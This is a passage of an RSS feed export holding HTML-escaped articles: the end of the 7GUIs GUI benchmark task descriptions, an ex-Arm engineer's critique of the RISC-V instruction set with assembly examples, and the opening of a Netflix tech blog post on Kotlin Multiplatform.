tick until &lt;em&gt;e ≥ d&lt;/em&gt; is true again. Clicking &lt;em&gt;R&lt;/em&gt; will reset &lt;em&gt;e&lt;/em&gt; to zero.&lt;/p&gt;
&lt;p&gt;Timer deals with concurrency in the sense that a timer process that updates the elapsed time runs concurrently to the user’s interactions with the GUI application. This also means that the solution to competing user and signal interactions is tested. The fact that slider adjustments must be reflected immediately moreover tests the responsiveness of the solution. A good solution will make it clear that the signal is a timer tick and, as always, has not much scaffolding.&lt;/p&gt;
&lt;p&gt;Timer is directly inspired by the timer example in the paper &lt;a target=&quot;_blank&quot; href=&quot;http://cs.brown.edu/~sk/Publications/Papers/Published/ick-adapt-oo-fwk-frp/paper.pdf&quot;&gt;Crossing State Lines: Adapting Object-Oriented Frameworks to Functional Reactive Languages&lt;/a&gt;.&lt;/p&gt;


&lt;h2 class=&quot;css-1isldpa&quot;&gt;CRUD&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Challenges:&lt;/em&gt; separating the domain and presentation logic, managing mutation, building a non-trivial layout.&lt;/p&gt;
&lt;img src=&quot;https://eugenkiss.github.io/7guis/static/crud.515ce94b.png&quot; class=&quot;css-a5rafi&quot;/&gt;&lt;p&gt;The task is to build a frame containing the following elements: a textfield &lt;em&gt;T&lt;sub&gt;prefix&lt;/sub&gt;&lt;/em&gt;, a pair of textfields &lt;em&gt;T&lt;sub&gt;name&lt;/sub&gt;&lt;/em&gt; and &lt;em&gt;T&lt;sub&gt;surname&lt;/sub&gt;&lt;/em&gt;, a listbox &lt;em&gt;L&lt;/em&gt;, buttons &lt;em&gt;B&lt;sub&gt;C&lt;/sub&gt;&lt;/em&gt;, &lt;em&gt;B&lt;sub&gt;U&lt;/sub&gt;&lt;/em&gt; and &lt;em&gt;B&lt;sub&gt;D&lt;/sub&gt;&lt;/em&gt; and the three labels as seen in the screenshot. &lt;em&gt;L&lt;/em&gt; presents a view of the data in the database that consists of a list of names. At most one entry can be selected in &lt;em&gt;L&lt;/em&gt; at a time. By entering a string into &lt;em&gt;T&lt;sub&gt;prefix&lt;/sub&gt;&lt;/em&gt; the user can filter the names whose surname start with the entered prefix—this should happen immediately without having to submit the prefix with enter. Clicking &lt;em&gt;B&lt;sub&gt;C&lt;/sub&gt;&lt;/em&gt; will append the resulting name from concatenating the strings in &lt;em&gt;T&lt;sub&gt;name&lt;/sub&gt;&lt;/em&gt; and &lt;em&gt;T&lt;sub&gt;surname&lt;/sub&gt;&lt;/em&gt; to &lt;em&gt;L&lt;/em&gt;. &lt;em&gt;B&lt;sub&gt;U&lt;/sub&gt;&lt;/em&gt; and &lt;em&gt;B&lt;sub&gt;D&lt;/sub&gt;&lt;/em&gt; are enabled iff an entry in &lt;em&gt;L&lt;/em&gt; is selected. In contrast to &lt;em&gt;B&lt;sub&gt;C&lt;/sub&gt;&lt;/em&gt;, &lt;em&gt;B&lt;sub&gt;U&lt;/sub&gt;&lt;/em&gt; will not append the resulting name but instead replace the selected entry with the new name. &lt;em&gt;B&lt;sub&gt;D&lt;/sub&gt;&lt;/em&gt; will remove the selected entry. The layout is to be done like suggested in the screenshot. In particular, &lt;em&gt;L&lt;/em&gt; must occupy all the remaining space.&lt;/p&gt;
&lt;p&gt;CRUD (Create, Read, Update and Delete) represents a typical graphical business application. The primary challenge is the separation of domain and presentation logic in the source code that is more or less forced on the implementer due to the ability to filter the view by a prefix. Traditionally, some form of MVC pattern is used to achieve the separation of domain and presentation logic. Also, the approach to managing the mutation of the list of names is tested. A good solution will have a good separation between the domain and presentation logic without much overhead (e.g. in the form of toolkit specific concepts or language/paradigm concepts), a mutation management that is fast but not error-prone and a natural representation of the layout (layout builders are allowed, of course, but would increase the overhead).&lt;/p&gt;
&lt;p&gt;CRUD is directly inspired by the crud example in the blog post &lt;a target=&quot;_blank&quot; href=&quot;http://apfelmus.nfshost.com/blog/2012/03/29-frp-three-principles-bidirectional-gui.html&quot;&gt;FRP - Three principles for GUI elements with bidirectional data flow&lt;/a&gt;.&lt;/p&gt;


&lt;h2 class=&quot;css-1isldpa&quot;&gt;Circle Drawer&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Challenges:&lt;/em&gt; undo/redo, custom drawing, dialog control*.&lt;/p&gt;
&lt;img src=&quot;https://eugenkiss.github.io/7guis/static/circledraw.235dfd8b.png&quot; class=&quot;css-a5rafi&quot;/&gt;&lt;p&gt;The task is to build a frame containing an undo and redo button as well as a canvas area underneath. Left-clicking inside an empty area inside the canvas will create an unfilled circle with a fixed diameter whose center is the left-clicked point. The circle nearest to the mouse pointer such that the distance from its center to the pointer is less than its radius, if it exists, is filled with the color gray. The gray circle is the selected circle &lt;em&gt;C&lt;/em&gt;. Right-clicking &lt;em&gt;C&lt;/em&gt; will make a popup menu appear with one entry “Adjust diameter..”. Clicking on this entry will open another frame with a slider inside that adjusts the diameter of &lt;em&gt;C&lt;/em&gt;. Changes are applied immediately. Closing this frame will mark the last diameter as significant for the undo/redo history. Clicking undo will undo the last significant change (i.e. circle creation or diameter adjustment). Clicking redo will reapply the last undoed change unless new changes were made by the user in the meantime.&lt;/p&gt;
&lt;p&gt;Circle Drawer’s goal is, among other things, to test how good the common challenge of implementing an undo/redo functionality for a GUI application can be solved. In an ideal solution the undo/redo functionality comes for free resp. just comes out as a natural consequence of the language / toolkit / paradigm. Moreover, Circle Drawer tests how dialog control*, i.e. keeping the relevant context between several successive GUI interaction steps, is achieved in the source code. Last but not least, the ease of custom drawing is tested.&lt;/p&gt;
&lt;p&gt;&lt;small&gt;* Dialog control is explained in more detail in the paper &lt;a target=&quot;_blank&quot; href=&quot;http://ceur-ws.org/Vol-610/paper11.pdf&quot;&gt;Developing GUI Applications: Architectural Patterns Revisited&lt;/a&gt; starting on page seven. The term describes the challenge of retaining context between successive GUI operations.&lt;/small&gt;&lt;/p&gt;


&lt;h2 class=&quot;css-1isldpa&quot;&gt;Cells&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Challenges:&lt;/em&gt; change propagation, widget customization, implementing a more authentic/involved GUI application.&lt;/p&gt;
&lt;img src=&quot;https://eugenkiss.github.io/7guis/static/cells.9544a72f.png&quot; class=&quot;css-a5rafi&quot;/&gt;&lt;p&gt;The task is to create a simple but usable spreadsheet application. The spreadsheet should be scrollable. The rows should be numbered from 0 to 99 and the columns from A to Z. Double-clicking a cell &lt;em&gt;C&lt;/em&gt; lets the user change &lt;em&gt;C&lt;/em&gt;’s formula. After having finished editing the formula is parsed and evaluated and its updated value is shown in &lt;em&gt;C&lt;/em&gt;. In addition, all cells which depend on &lt;em&gt;C&lt;/em&gt; must be reevaluated. This process repeats until there are no more changes in the values of any cell (change propagation). Note that one should not just recompute the value of every cell but only of those cells that depend on another cell’s changed value. If there is an already provided spreadsheet widget it should not be used. Instead, another similar widget (like JTable in Swing) should be customized to become a reusable spreadsheet widget.&lt;/p&gt;
&lt;p&gt;Cells is a more authentic and involved task that tests if a particular approach also scales to a somewhat bigger application. The two primary GUI-related challenges are intelligent propagation of changes and widget customization. Admittedly, there is a substantial part that is not necessarily very GUI-related but that is just the nature of a more authentic challenge. A good solution’s change propagation will not involve much effort and the customization of a widget should not prove too difficult. The domain-specific code is clearly separated from the GUI-specific code. The resulting spreadsheet widget is reusable.&lt;/p&gt;
&lt;p&gt;Cells is directly inspired by the &lt;a target=&quot;_blank&quot; href=&quot;https://www.artima.com/pins1ed/the-scells-spreadsheet.html&quot;&gt;SCells spreadsheet example&lt;/a&gt; from the book &lt;em&gt;Programming in Scala&lt;/em&gt;. Please refer to the book (or the implementations in this repository) for more details especially with respect to the not directly GUI-related concerns like parsing and evaluating formulas and the precise syntax and semantics of the spreadsheet language.&lt;/p&gt;

</description>
<pubDate>Sun, 01 Nov 2020 11:20:58 +0000</pubDate>
<dc:creator>dsego</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://eugenkiss.github.io/7guis/tasks/</dc:identifier>
</item>
<item>
<title>An ex-ARM engineer critiques RISC-V</title>
<link>https://gist.github.com/erincandescent/8a10eeeea1918ee4f9d9982f7618ef68</link>
<guid isPermaLink="true" >https://gist.github.com/erincandescent/8a10eeeea1918ee4f9d9982f7618ef68</guid>
<description>&lt;h2&gt;Foreward&lt;/h2&gt;&lt;p&gt;This document was originally written several years ago. At the time I was working as an execution core verification engineer at Arm. The following points are coloured heavily by working in and around the execution cores of various processors. Apply a pinch of salt; points contain varying degrees of opinion.&lt;/p&gt;
&lt;p&gt;It is still my opinion that RISC-V could be much better designed; though I will also say that if I was building a 32 or 64-bit CPU today I'd likely implement the architecture to benefit from the existing tooling.&lt;/p&gt;
&lt;p&gt;Mostly based upon the RISC-V ISA spec v2.0. Some updates have been made for v2.2&lt;/p&gt;

&lt;p&gt;The RISC-V ISA has pursued minimalism to a fault. There is a large emphasis on minimizing instruction count, normalizing encoding, etc. This pursuit of minimalism has resulted in false orthogonalities (such as reusing the same instruction for branches, calls and returns) and a requirement for superfluous instructions which impacts code density both in terms of size and number of instructions.&lt;/p&gt;
&lt;p&gt;Consider the following C code, for example:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int readidx(int *p, size_t idx)
{ return p[idx]; }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This is a simple case of array indexing, a very common operation. Consider the compilation of this for x86_64:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;mov eax, [rdi+rsi*4]
ret
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;or ARM:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ldr r0, [r0, r1, lsl #2]
bx lr // return
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Meanwhile, the required code for RISC-V:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# apologies for any syntax nits - there aren't any online risc-v
# compilers
slli a1, a1, 2
add a0, a1, a1
lw a0, a0, 0
jalr r0, r1, 0 // return
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;RISC-V's simplifications make the decoder (i.e. CPU frontend) easier, at the expense of executing more instructions. However, scaling the width of a pipeline is a hard problem, while the decoding of slightly (or highly) irregular instructions is well understood (the primary difficulty arises when determining the length of an instruction is nontrivial - x86 is a particularly bad case of this with its' numerous prefixes).&lt;/p&gt;
&lt;p&gt;The simplification of an instruction set should not be pursued to its' limits. A register + shifted register memory operation is not a complicated instruction; it is a very common operation in programs, and very easy for a CPU to implement performantly. If a CPU is not capable of implementing the instruction directly, it can break it down into its' constituent operations with relative ease; this is a much easier problem than fusing sequences of simple operations.&lt;/p&gt;
&lt;p&gt;We should distinguish the &quot;Complex&quot; instructions of CISC CPUs - complicated, rarely used, and universally low performance, from the &quot;Featureful&quot; instructions common to both CISC and RISC CPUs, which combine a small sequence of operations, are commonly used, and high performance.&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;Highly unconstrained extensibility. While this is a goal of RISC-V, it is also a recipe for a fragmented, incompatible ecosystem and will have to be managed with extreme care.&lt;/li&gt;
&lt;li&gt;Same instruction (&lt;code&gt;JALR&lt;/code&gt;) used for both calls, returns and register-indirect branches (requires extra decode for branch prediction)
&lt;ul&gt;&lt;li&gt;Call: &lt;code&gt;Rd&lt;/code&gt; = &lt;code&gt;R1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Return: &lt;code&gt;Rd&lt;/code&gt; = &lt;code&gt;R0&lt;/code&gt;, &lt;code&gt;Rs&lt;/code&gt; = &lt;code&gt;R1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Indirect branch: &lt;code&gt;Rd&lt;/code&gt; = &lt;code&gt;R0&lt;/code&gt;, &lt;code&gt;Rs&lt;/code&gt; ≠ &lt;code&gt;R1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;(Weirdo branch: &lt;code&gt;Rd&lt;/code&gt; ≠ &lt;code&gt;R0&lt;/code&gt;, &lt;code&gt;Rd&lt;/code&gt; ≠ &lt;code&gt;R1&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Variable length encoding not self synchronizing (This is common - e.g x86 and Thumb-2 both have this issue - but it causes various problems both with implementation and security e.g. return-oriented-programming attacks)&lt;/li&gt;
&lt;li&gt;RV64I requires sign extension of all 32-bit values. This produces unnecessary top-half toggling or requires special accomodation of the upper half of registers. Zero extension is preferable (as it reduces toggling, and can generally be optimized by tracking an &quot;is zero&quot; bit once the upper half is known to be zero)&lt;/li&gt;
&lt;li&gt;Multiply is optional - while fast multipliers occupy non-negligible area on tiny implementations, small multipliers can be created which consume little area, and it is possible to make extensive re-use of the existing ALU for a multiple-cycle multiplications.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LR&lt;/code&gt;/&lt;code&gt;SC&lt;/code&gt; has a strict eventual forward progress requirement for a limited subset of uses. While this constraint is quite tight, it does potentially pose some problems for small implementations (particularly those without cache)
&lt;ul&gt;&lt;li&gt;This appears to be a substitute for a CAS instruction, see comments on that&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;FP sticky bits and rounding mode are in the same register. This requires serialization of the FP pipe if a RMW operation is performed to change rounding mode&lt;/li&gt;
&lt;li&gt;FP Instructions are encoded for 32, 64 and 128-bit precision, but not 16-bit (which is significantly more common in hardware than 128-bit)
&lt;ul&gt;&lt;li&gt;This could be easily rectified - size encoding &lt;code&gt;2'b10&lt;/code&gt; is free&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Update:&lt;/em&gt; V2.2 has a &lt;em&gt;decimal&lt;/em&gt; FP extension placeholder, but no half-precision placeholder. The mind kinda boggles.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;How FP values are represented in the FP register file is unspecified but observable (by load/store)
&lt;ul&gt;&lt;li&gt;Emulator authors will hate you&lt;/li&gt;
&lt;li&gt;VM migration may become impossible&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Update:&lt;/em&gt; V2.2 requires NaN boxing wider values&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;&lt;li&gt;No condition codes, instead compare-and-branch instructions. This is not problematic by itself, but rather in its' implications:
&lt;ul&gt;&lt;li&gt;Decreased encoding space in conditional branches due to requirement to encode one or two register specifiers&lt;/li&gt;
&lt;li&gt;No conditional selects (useful for highly unpredictable branches)&lt;/li&gt;
&lt;li&gt;No add with carry/subtract with carry or borrow&lt;/li&gt;
&lt;li&gt;(Note that this is still better than ISAs which write flags to a GPR and then branch upon the resulting flags)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Highly precise counters seem to be &lt;em&gt;required&lt;/em&gt; by the user level ISA. In practice, exposing these to applications is a great vector for sidechannel attacks&lt;/li&gt;
&lt;li&gt;Multiply and divide are part of the same extension, and it appears that if one is implemented the other must be also. Multiply is significantly simpler than divide, and common on most CPUs even where divide is not&lt;/li&gt;
&lt;li&gt;No atomic instructions in the base ISA. Multi-core microcontrollers are increasingly common, and LL/SC type atomics inexpensive (only 1 bit of CPU state required for minimal single CPU implementations).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LR&lt;/code&gt;/&lt;code&gt;SC&lt;/code&gt; are in the same extension as more complicated atomic instructions, which limits implementation flexibility for small implementations&lt;/li&gt;
&lt;li&gt;General (non &lt;code&gt;LR&lt;/code&gt;/&lt;code&gt;SC&lt;/code&gt;) atomics do not include a &lt;code&gt;CAS&lt;/code&gt; primitive
&lt;ul&gt;&lt;li&gt;The motivation is to avoid the need for an instruction which reads 5 registers (&lt;code&gt;Addr&lt;/code&gt;, &lt;code&gt;CmpHi:CmpLo&lt;/code&gt;, &lt;code&gt;SwapHi:SwapLo&lt;/code&gt;), but this is likely to impose less overhead on the implementation than the guaranteed-forward-progress LR/SC which is provided to replace it&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Atomic instructions are provided which operate on 32-bit and 64-bit quantities, but not 8 or 16-bit&lt;/li&gt;
&lt;li&gt;For RV32I, no way to tranfer a DP FP value between the integer and FP register files except through memory&lt;/li&gt;
&lt;li&gt;e.g. RV32I 32-bit &lt;code&gt;ADD&lt;/code&gt; and RV64I 64-bit &lt;code&gt;ADD&lt;/code&gt; share encodings, and RVI64 adds a different &lt;code&gt;ADD.W&lt;/code&gt; encoding. This is needless complication for a CPU which implements both instructions - it would have been preferable to add a new 64-bit encoding instead&lt;/li&gt;
&lt;li&gt;No &lt;code&gt;MOV&lt;/code&gt; instruction. The &lt;code&gt;MV&lt;/code&gt; assembler alias is implemted as &lt;code&gt;MV rD, rS&lt;/code&gt; -&amp;gt; &lt;code&gt;ADDI rD, rS, 0&lt;/code&gt;. &lt;code&gt;MOV&lt;/code&gt; optimization is commonly performed by high-end processors (especially out-of-order); recognizing RISC-V's canonical &lt;code&gt;MV&lt;/code&gt; requires oring a 12-bit immediate
&lt;ul&gt;&lt;li&gt;Absent a &lt;code&gt;MOV&lt;/code&gt; instruction, &lt;code&gt;ADD rD, rS, r0&lt;/code&gt; would actually be a preferable canonical &lt;code&gt;MOV&lt;/code&gt; as it is easier to decode and CPUs normally have special case logic for recognizing the zero register&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;JAL&lt;/code&gt; wastes 5 bits encoding the link register, which will always be &lt;code&gt;R1&lt;/code&gt; (or &lt;code&gt;R0&lt;/code&gt; for branches)
&lt;ul&gt;&lt;li&gt;This means that RV32I has 21-bit branch displacements (insufficient for large applications - e.g. web browsers - without using multiple instruction sequences and/or branch islands)&lt;/li&gt;
&lt;li&gt;This is a regression from the v1.0 ISA!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Despite great effort being expended on a uniform encoding, load/store instructions are encoded differently (register vs immediate fields swapped)
&lt;ul&gt;&lt;li&gt;It seems orthogonality of destination register encoding was preferred over orthogonality of encoding two highly related instructions. This choice seems a little odd given that address generation is the more timing critical operation.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;No loads with register offsets (&lt;code&gt;Rbase&lt;/code&gt;+&lt;code&gt;Roffset&lt;/code&gt;) or indexes (&lt;code&gt;Rbase&lt;/code&gt;+&lt;code&gt;Rindex&lt;/code&gt; &amp;lt;&amp;lt; &lt;code&gt;Scale&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;FENCE.I&lt;/code&gt; implies full synchronization of instruction cache with all preceding stores, fenced or unfenced. Implementations will need to either flush entire I$ on fence, or snoop both D$ and the store buffer&lt;/li&gt;
&lt;li&gt;In RV32I, reading the 64-bit counters requires reading upper half twice, comparing and branching in case a carry occurs between the lower and upper half during a read operation
&lt;ul&gt;&lt;li&gt;Normally 32-bit ISAs include a &quot;read pair of special registers&quot; instruction to avoid this issue&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;No architecturally defined &quot;hint&quot; encoding space. Hint encodings are those which execute as &lt;code&gt;NOP&lt;/code&gt;s on current processors but which have some behavior on later varients
&lt;ul&gt;&lt;li&gt;Common examples of pure &quot;&lt;code&gt;NOP&lt;/code&gt; hints&quot; are things like spinlock yields.&lt;/li&gt;
&lt;li&gt;More complicated hints have also been implemented (i.e. those which have visible side effects on new processors; for example, the x86 bounds checking instructions are encoded in hint space so that binaries remain backwards compatible)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Sun, 01 Nov 2020 10:02:42 +0000</pubDate>
<dc:creator>ducktective</dc:creator>
<og:image>https://github.githubassets.com/images/modules/gists/gist-og-image.png</og:image>
<og:type>article</og:type>
<og:title>RISC-V.md</og:title>
<og:url>https://gist.github.com/erincandescent/8a10eeeea1918ee4f9d9982f7618ef68</og:url>
<og:description>GitHub Gist: instantly share code, notes, and snippets.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://gist.github.com/erincandescent/8a10eeeea1918ee4f9d9982f7618ef68</dc:identifier>
</item>
<item>
<title>Netflix Android and iOS Studio Apps now powered by Kotlin Multiplatform</title>
<link>https://netflixtechblog.com/netflix-android-and-ios-studio-apps-kotlin-multiplatform-d6d4d8d25d23</link>
<guid isPermaLink="true" >https://netflixtechblog.com/netflix-android-and-ios-studio-apps-kotlin-multiplatform-d6d4d8d25d23</guid>
<description>&lt;div&gt;

&lt;div class=&quot;dl&quot;&gt;
&lt;div class=&quot;n dm dn do dp&quot;&gt;
&lt;div class=&quot;o n&quot;&gt;
&lt;div&gt;&lt;a href=&quot;https://medium.com/@NetflixTechBlog?source=post_page-----d6d4d8d25d23--------------------------------&quot; rel=&quot;noopener&quot;&gt;&lt;img alt=&quot;Netflix Technology Blog&quot; class=&quot;s dq dr ds&quot; src=&quot;https://miro.medium.com/fit/c/96/96/1*BJWRqfSMf9Da9vsXG9EBRQ.jpeg&quot; width=&quot;48&quot; height=&quot;48&quot;/&gt;&lt;/a&gt;&lt;/div&gt;

&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p id=&quot;9955&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;By &lt;a href=&quot;https://www.linkedin.com/in/davidmatthewhenry/&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;David Henry&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://www.linkedin.com/in/hemel-yahya-b193681b/&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;Mel Yahya&lt;/a&gt;&lt;/p&gt;
&lt;p id=&quot;857e&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;Over the last few years Netflix has been developing a mobile app called Prodicle to innovate in the physical production of TV shows and movies. The world of physical production is fast-paced, and needs vary significantly between the country, region, and even from one production to the next. The nature of the work means we’re developing write-heavy software, in a distributed environment, on devices where less than ⅓ of our users have very reliable connectivity whilst on set, and with a limited margin for error. For these reasons, as a small engineering team, we’ve found that optimizing for reliability and speed of product delivery is required for us to serve our evolving customers’ needs successfully.&lt;/p&gt;
&lt;p id=&quot;c491&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;The high likelihood of unreliable network connectivity led us to lean into mobile solutions for robust client side persistence and offline support. The need for fast product delivery led us to experiment with &lt;a class=&quot;ef gx&quot; rel=&quot;noopener&quot; href=&quot;https://netflixtechblog.com/making-our-android-studio-apps-reactive-with-ui-components-redux-5e37aac3b244&quot;&gt;a multiplatform architecture&lt;/a&gt;. Now we’re taking this one step further by using &lt;a href=&quot;https://kotlinlang.org/lp/mobile/&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;Kotlin Multiplatform&lt;/a&gt; to write platform agnostic business logic &lt;em class=&quot;gy&quot;&gt;once&lt;/em&gt; in Kotlin and compiling to a Kotlin library for Android and a native Universal Framework for iOS via &lt;a href=&quot;https://kotlinlang.org/docs/reference/native-overview.html&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;Kotlin/Native&lt;/a&gt;.&lt;/p&gt;


&lt;blockquote class=&quot;it iu iv&quot; readability=&quot;9&quot;&gt;
&lt;p id=&quot;145a&quot; class=&quot;fz ga gy gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;Kotlin Multiplatform allows you to use a single codebase for the business logic of iOS and Android apps. You only need to write platform-specific code where it’s necessary, for example, to implement a native UI or when working with platform-specific APIs.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p id=&quot;efcd&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;Kotlin Multiplatform approaches cross-platform mobile development differently from some well known technologies in the space. Where other technologies abstract away or completely replace platform specific app development, Kotlin Multiplatform is complementary to existing platform specific technologies and is geared towards replacing platform agnostic business logic. It’s a new tool in the toolbox as opposed to replacing the toolbox.&lt;/p&gt;
&lt;p id=&quot;ff8e&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;This approach works well for us for several reasons:&lt;/p&gt;
&lt;ol class=&quot;&quot;&gt;&lt;li id=&quot;df63&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw iw ix iy dk&quot;&gt;Our Android and iOS studio apps have a shared architecture with similar or in some cases identical business logic written on both platforms.&lt;/li&gt;
&lt;li id=&quot;fae5&quot; class=&quot;fz ga cn gb b gc iz ge gf gg ja gi gj gk jb gm gn go jc gq gr gs jd gu gv gw iw ix iy dk&quot;&gt;Almost 50% of the production code in our Android and iOS apps is decoupled from the underlying platform.&lt;/li&gt;
&lt;li id=&quot;96af&quot; class=&quot;fz ga cn gb b gc iz ge gf gg ja gi gj gk jb gm gn go jc gq gr gs jd gu gv gw iw ix iy dk&quot;&gt;Our appetite for exploring the latest technologies offered by respective platforms (Android Jetpack Compose, Swift UI, etc) isn’t hampered in any way.&lt;/li&gt;
&lt;/ol&gt;&lt;p id=&quot;3cf5&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;So, what are we doing with it?&lt;/p&gt;

&lt;p id=&quot;9430&quot; class=&quot;fz ga cn gb b gc je ge gf gg jf gi gj gk jg gm gn go jh gq gr gs ji gu gv gw cf dk&quot;&gt;As noted earlier, our user needs vary significantly from one production to the next. This translates to a large number of app configurations to toggle feature availability and optimize the in-app experience for each production. Decoupling the code that manages these configurations from the apps themselves helps to reduce complexity as the apps grow. Our first exploration with code sharing involves the implementation of a mobile SDK for our internal experience management tool, Hendrix.&lt;/p&gt;
&lt;p id=&quot;20a3&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;At its core, Hendrix is a simple interpreted language that expresses how configuration values should be computed. These expressions are evaluated in the current app session context, and can access data such as A/B test assignments, locality, device attributes, etc. For our use-case, we’re configuring the availability of production, version, and region specific app feature sets.&lt;/p&gt;
&lt;p id=&quot;0dd2&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;Poor network connectivity coupled with frequently changing configuration values in response to user activity means that on-device rule evaluation is preferable to server-side evaluation.&lt;/p&gt;
&lt;p id=&quot;e031&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;This led us to build a lightweight Hendrix mobile SDK — a great candidate for Kotlin Multiplatform as it requires significant business logic and is entirely platform agnostic.&lt;/p&gt;

&lt;p id=&quot;d1e2&quot; class=&quot;fz ga cn gb b gc je ge gf gg jf gi gj gk jg gm gn go jh gq gr gs ji gu gv gw cf dk&quot;&gt;For brevity, we’ll skip over the Hendrix specific details and touch on some of the differences involved in using Kotlin Multiplatform in place of Kotlin/Swift.&lt;/p&gt;
&lt;h2 id=&quot;560c&quot; class=&quot;jj hy cn du hz jk jl jm ic jn jo jp if jq jr js ij jt ju jv in jw jx jy ir jz dk&quot;&gt;Build&lt;/h2&gt;
&lt;p id=&quot;cebb&quot; class=&quot;fz ga cn gb b gc je ge gf gg jf gi gj gk jg gm gn go jh gq gr gs ji gu gv gw cf dk&quot;&gt;For Android, it’s business as usual. The Hendrix Multiplatform SDK is imported via gradle as an Android library project dependency in the same fashion as any other dependency. On the iOS side, the native binary is included in the Xcode project as a universal framework.&lt;/p&gt;
&lt;h2 id=&quot;bc9c&quot; class=&quot;jj hy cn du hz jk jl jm ic jn jo jp if jq jr js ij jt ju jv in jw jx jy ir jz dk&quot;&gt;Developer ergonomics&lt;/h2&gt;
&lt;p id=&quot;a730&quot; class=&quot;fz ga cn gb b gc je ge gf gg jf gi gj gk jg gm gn go jh gq gr gs ji gu gv gw cf dk&quot;&gt;Kotlin Multiplatform source code can be edited, recompiled, and can have a debugger attached with breakpoints in Android Studio and Xcode (including lldb support). Android Studio works out of the box, Xcode support is achieved via TouchLabs’ &lt;a href=&quot;https://github.com/touchlab/xcode-kotlin&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;xcode-kotlin&lt;/a&gt; plugin.&lt;/p&gt;

&lt;em class=&quot;kg&quot;&gt;Debugging Kotlin source code from Xcode.&lt;/em&gt;
&lt;h2 id=&quot;21ca&quot; class=&quot;jj hy cn du hz jk jl jm ic jn jo jp if jq jr js ij jt ju jv in jw jx jy ir jz dk&quot;&gt;Networking&lt;/h2&gt;
&lt;p id=&quot;008a&quot; class=&quot;fz ga cn gb b gc je ge gf gg jf gi gj gk jg gm gn go jh gq gr gs ji gu gv gw cf dk&quot;&gt;Hendrix interprets rule set(s) — remotely configurable files that get downloaded to the device. We’re using &lt;a href=&quot;https://ktor.io/&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;Ktor&lt;/a&gt;’s Multiplatform HttpClient to embed our networking code within the SDK.&lt;/p&gt;
&lt;h2 id=&quot;fb74&quot; class=&quot;jj hy cn du hz jk jl jm ic jn jo jp if jq jr js ij jt ju jv in jw jx jy ir jz dk&quot;&gt;Disk cache&lt;/h2&gt;
